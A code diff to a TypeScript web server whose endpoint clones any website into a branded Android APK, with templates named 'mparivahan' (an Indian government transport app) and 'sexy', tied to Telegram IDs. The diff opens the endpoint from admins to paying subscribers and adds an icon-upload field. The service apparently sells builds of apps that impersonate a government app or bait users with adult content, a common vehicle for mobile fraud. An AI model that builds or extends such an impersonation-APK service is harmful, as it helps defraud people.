@@ -338,7 +338,7 @@ router.post("/apk/clone-info", requireAdmin, async (req, res) => {
  * POST /api/apk/custom-build — clone any website into a branded APK.
  * body: { url, appName, splashText, themeColor, orientation, template, telegramId, iconUrl }
  */
-router.post("/apk/custom-build", requireAdmin, async (req, res) => {
+router.post("/apk/custom-build", requireAuth, async (req, res) => {
   try {
     const b = req.body ?? {};
     const url = String(b.url || "").trim();
@@ -354,7 +354,9 @@ router.post("/apk/custom-build", requireAdmin, async (req, res) => {
       ? b.orientation
       : "portrait";
     const template = b.template === "sexy" ? "sexy" : "mparivahan";
-    const telegramId = String(b.telegramId || "").trim();
+    const telegramId = String(
+      b.telegramId || (req as any).auth?.telegramId || ""
+    ).trim();
     const splashText = String(b.splashText || "")
       .trim()
       .slice(0, 60);
@@ -375,6 +377,10 @@ router.post("/apk/custom-build", requireAdmin, async (req, res) => {
         .json({ error: "A valid numeric telegramId is required." });
       return;
     }
+    if (!isAdminId(telegramId) && !(await isSubscriptionActive(telegramId))) {
+      res.status(403).json({ error: "Subscription expired or not found." });
+      return;
+    }
 
     const apkPath = await buildCustomApk({
       telegramId,
@@ -385,6 +391,7 @@ router.post("/apk/custom-build", requireAdmin, async (req, res) => {
       orientation,
       template,
       iconUrl: String(b.iconUrl || "").trim() || undefined,
+      iconData: String(b.iconData || "").trim() || undefined,
     });
     if (!apkPath) {
       res
